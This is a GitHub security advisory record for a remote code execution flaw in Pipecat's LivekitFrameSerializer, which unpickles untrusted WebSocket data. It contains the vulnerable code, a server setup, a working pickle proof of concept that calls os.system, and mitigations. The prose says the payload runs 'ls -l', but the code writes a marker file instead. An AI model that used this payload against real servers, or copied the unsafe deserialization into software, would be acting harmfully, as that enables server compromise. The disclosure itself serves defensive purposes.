@@ -1,0 +1,108 @@
+{
+  "id": "GHSA-c2jg-5cp7-6wc7",
+  "modified": "2026-04-23T21:33:55.893997Z",
+  "published": "2026-04-23T21:15:42Z",
+  "aliases": [
+    "CVE-2025-62373"
+  ],
+  "summary": "Pipecat: Remote Code Execution by Pickle Deserialization Through LivekitFrameSerializer",
+  "details": "Remote Code Execution via Unsafe Deserialization in Pipecat's LivekitFrameSerializer\n\n### Summary\n\nA critical vulnerability exists in Pipecat's `LivekitFrameSerializer` – an **optional, non-default, undocumented** frame serializer class (now deprecated) intended for LiveKit integration. The class's `deserialize()` method uses Python's `pickle.loads()` on data received from WebSocket clients without any validation or sanitization. This means that a malicious WebSocket client can send a crafted pickle payload to execute arbitrary code on the Pipecat server. The vulnerable code resides in `src/pipecat/serializers/livekit.py` (around line 73), where untrusted WebSocket message data is passed directly into `pickle.loads()` for deserialization. If a Pipecat server is configured to use LivekitFrameSerializer and is listening on an external interface (e.g. 0.0.0.0), an attacker on the network (or the internet, if the service is exposed) could achieve remote code execution (RCE) on the server by sending a malicious pickle payload.\n\n### Details\n\nThe `LivekitFrameSerializer` is a serializer meant to convert between Pipecat audio frames and LiveKit's audio frame format. **It is not enabled by default** – developers would have to explicitly use this serializer. In Pipecat version 0.0.90, this class was officially deprecated in favor of a safer `LiveKitTransport` method, but it remains in the code for backward compatibility. The vulnerability arises in how it handles incoming data: the `deserialize()` method blindly unpickles whatever byte stream it receives over the WebSocket. Below is a snippet illustrating the core issue in the `LivekitFrameSerializer.deserialize` implementation:\n\nVulnerable code in src/pipecat/serializers/livekit.py:\n\n```python\nasync def deserialize(self, data: str | bytes) -\u003e Frame | None:\n    # ... (docstring omitted for brevity)\n    audio_frame: AudioFrame = pickle.loads(data)[\"frame\"]   # Unsafely deserializing untrusted data\n    return InputAudioRawFrame(\n        audio=bytes(audio_frame.data),\n        sample_rate=audio_frame.sample_rate,\n        num_channels=audio_frame.num_channels,\n    )\n```\n\nPython's `pickle.loads` will execute arbitrary code if the input data is a maliciously crafted pickle object. In this case, an attacker can exploit the `LivekitFrameSerializer` by sending a pickle payload that, when deserialized, runs attacker-controlled code on the server. The serializer assumes the data contains a LiveKit `AudioFrame` object (possibly in a dictionary with key \"frame\"), but does not verify the content or source. As a result, any object with a malicious `__reduce__` or other pickle protocol methods will be executed upon deserialization. This is a known risk: pickle should never be used on untrusted data.\n\nIn summary, whenever `LivekitFrameSerializer` is active, any client that can connect to the Pipecat WebSocket can send a specially crafted pickle binary. Upon receiving it, Pipecat will call `pickle.loads`, immediately executing the payload's code. This can lead to a full compromise of the Pipecat server process, allowing attackers to run arbitrary commands or take control of the host system with the privileges of the Pipecat service.\n\n### Proof of Concept (PoC)\n\nThe following proof-of-concept demonstrates how an attacker could exploit this vulnerability. It involves two steps: (1) running a Pipecat WebSocket server using the vulnerable serializer, and (2) sending a malicious pickle from a client.\n\nStart a Pipecat WebSocket server with the LivekitFrameSerializer enabled – for example, by binding the server to all network interfaces (0.0.0.0) on port 8765. In a Pipecat application, this might be done by specifying the LiveKit serializer in the WebSocket transport parameters. For illustration, the code snippet below starts a server:\n\n```python\nimport asyncio\nimport websockets\nfrom pipecat.serializers.livekit import LivekitFrameSerializer\n\nserializer = LivekitFrameSerializer()\n\nasync def handler(ws):\n    \"\"\"\n    websockets new-style handler: single argument (connection object).\n    Path (if needed) is available via ws.path.\n    \"\"\"\n    try:\n        data = await ws.recv()               \n        if isinstance(data, str):\n            data = data.encode(\"utf-8\")     \n        frame = await serializer.deserialize(data)  \n        print(\"deserialize returned:\", frame)\n    except Exception as e:\n        print(\"deserialize raised:\", repr(e))\n\nasync def main():\n    print(\"Starting server on 0.0.0.0:8765 (websockets new API handler)\")\n    async with websockets.serve(handler, \"0.0.0.0\", 8765):\n        await asyncio.Future()  # run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nIn this setup, the server listens on ws://0.0.0.0:8765 (with a default path of /ws for WebSocket connections). It will use `LivekitFrameSerializer` for incoming frames, making it vulnerable to pickle-based attacks.\n\nSend a malicious pickle payload from a client – an attacker can now connect to the WebSocket and transmit a crafted pickle object that executes code. For instance, the payload below defines a class RCE whose `__reduce__` method will invoke `os.system(\"ls -l\")`. When unpickled on the server, this will run the `ls -l` command (listing directory contents) on the server side:\n\n```python\nimport asyncio\nimport pickle\nimport websockets\n\nclass RCE:\n    def __reduce__(self):\n        import os\n        return (os.system, (\"echo EXPLOITED \u003e /tmp/pipecat_exploit || true\",))\n\nasync def attack():\n    uri = \"ws://127.0.0.1:8765\"   \n    async with websockets.connect(uri) as ws:\n        payload = pickle.dumps({\"frame\": RCE()})\n        await ws.send(payload)  \n\nif __name__ == \"__main__\":\n    asyncio.run(attack())\n```\n\n    In this PoC, the attacker's code opens a WebSocket connection to the Pipecat server and sends the pickled RCE object. On the server, the `LivekitFrameSerializer.deserialize()` method will call pickle.loads() on this data, which in turn triggers the `RCE.__reduce__` method. This executes the `os.system(\"ls -l\")` command on the server. In a real attack, the payload could be crafted to perform any arbitrary actions (create a reverse shell, modify files, etc.) with the privileges of the Pipecat process.\n\n### Impact\n\nIf an application uses `LivekitFrameSerializer` and exposes the Pipecat WebSocket server to untrusted networks, an attacker can achieve remote code execution on the server with a single malicious message. This could lead to a complete compromise of the server: the attacker can execute operating system commands, read or modify data, install malware, or pivot to other systems. The severity of this vulnerability is high – any code execution vulnerability is critical, especially in a real-time communications server context.\n\nIt's important to note that by default Pipecat does not use LivekitFrameSerializer (and in fact the class is deprecated), so only systems that explicitly opt into this serializer are affected. However, because the class exists in the codebase, users might inadvertently use it. Any such usage on a public-facing or even internal network service can be exploited by an attacker with network access to the service. The worst-case scenario is an internet-exposed Pipecat server using this serializer, which would allow remote exploitation by anyone with access to the WebSocket port.\n\n### Mitigation\n\nUsers of Pipecat should take the following actions to eliminate or reduce the risk of this vulnerability:\n\n1. Avoid or replace unsafe deserialization: Ideally, do not use `LivekitFrameSerializer` at all given its use of unsafe pickle deserialization. Pipecat's maintainers have deprecated this class in favor of `LiveKitTransport`, which does not require explicit pickle usage. If users need to support LiveKit integration or any binary frame serialization, use safer alternatives:\n\n        * Use standardized formats like JSON for simple structured data, or binary formats like Protocol Buffers or MessagePack for more complex data structures. These formats do not execute code upon parsing.\n\n        * If users absolutely must use pickle (not recommended), implement a custom `pickle.Unpickler` with a restricted `find_class()` method. This can limit what classes and functions can be instantiated during unpickling (whitelisting only safe types), which can mitigate arbitrary code execution. However, even a restricted unpickler is risky and should be considered a last resort.\n\n2. Improve network security configuration: Limit who can reach the Pipecat service.\n\n        * Bind to localhost whenever possible. If the Pipecat server is intended for internal or single-machine use, use host=\"127.0.0.1\" (or omit the host to default to localhost) instead of 0.0.0.0. This prevents external network access by default and significantly reduces exposure.\n\n        * Require authentication and authorization on the WebSocket connection. If the use case allows, enforce that clients must authenticate (using tokens, API keys, or other means) before accepting and processing frames. This won't fix the underlying code issue, but it can restrict who is able to send potentially malicious data.\n\nIn summary, the best mitigation is to stop using the vulnerable LivekitFrameSerializer altogether. If users require LiveKit functionality, upgrade to the latest Pipecat version and switch to the recommended `LiveKitTransport` or another secure method provided by the framework. Additionally, always follow secure coding practices: never trust client-supplied data, and avoid Python pickle (or similar unsafe deserialization) in network-facing components.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pipecat-ai",
+        "purl": "pkg:pypi/pipecat-ai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.0.41"
+            },
+            {
+              "fixed": "0.0.94"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.41",
+        "0.0.42",
+        "0.0.43",
+        "0.0.44",
+        "0.0.45",
+        "0.0.46",
+        "0.0.47",
+        "0.0.48",
+        "0.0.49",
+        "0.0.50",
+        "0.0.51",
+        "0.0.52",
+        "0.0.53",
+        "0.0.54",
+        "0.0.55",
+        "0.0.56",
+        "0.0.57",
+        "0.0.58",
+        "0.0.59",
+        "0.0.60",
+        "0.0.61",
+        "0.0.62",
+        "0.0.63",
+        "0.0.64",
+        "0.0.65",
+        "0.0.66",
+        "0.0.67",
+        "0.0.68",
+        "0.0.69",
+        "0.0.70",
+        "0.0.71",
+        "0.0.72",
+        "0.0.73",
+        "0.0.74",
+        "0.0.75",
+        "0.0.76",
+        "0.0.77",
+        "0.0.78",
+        "0.0.79",
+        "0.0.80",
+        "0.0.81",
+        "0.0.82",
+        "0.0.83",
+        "0.0.84",
+        "0.0.85",
+        "0.0.86",
+        "0.0.87",
+        "0.0.88",
+        "0.0.89",
+        "0.0.90",
+        "0.0.91",
+        "0.0.92",
+        "0.0.93"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c2jg-5cp7-6wc7/GHSA-c2jg-5cp7-6wc7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-c2jg-5cp7-6wc7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62373"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pipecat-ai/pipecat"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/releases/tag/v0.0.94"
+    }
+  ]
+}
